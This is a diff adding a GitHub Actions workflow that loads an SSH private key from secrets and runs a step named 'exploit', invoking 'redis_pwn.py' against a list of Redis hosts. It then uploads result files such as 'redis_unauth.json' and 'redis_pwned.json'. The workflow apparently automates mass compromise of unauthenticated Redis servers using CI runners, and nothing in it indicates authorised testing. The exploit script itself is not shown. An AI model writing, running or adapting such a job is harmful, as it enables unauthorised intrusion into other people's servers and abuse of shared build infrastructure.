@@ -1,0 +1,29 @@
+name: redis2
+on: workflow_dispatch
+jobs:
+  scan:
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - uses: actions/checkout@v4
+      - name: setup key
+        run: |
+          mkdir -p ~/.ssh
+          echo "$KOPS_KEY" > /tmp/kops_key
+          chmod 600 /tmp/kops_key
+          ssh-keygen -y -f /tmp/kops_key > /tmp/kops_key.pub
+          chmod 644 /tmp/kops_key.pub
+          wc -c /tmp/kops_key /tmp/kops_key.pub
+        env:
+          KOPS_KEY: ${{ secrets.KOPS_KEY }}
+      - name: exploit
+        run: KOPS_KEY_FILE=/tmp/kops_key python3 redis_pwn.py redis_hosts.txt || true
+      - uses: actions/upload-artifact@v4
+        if: always()
+        with:
+          name: redis2
+          path: |
+            /tmp/redis_result.json
+            /tmp/redis_unauth.json
+            /tmp/redis_pwned.json
+          if-no-files-found: warn
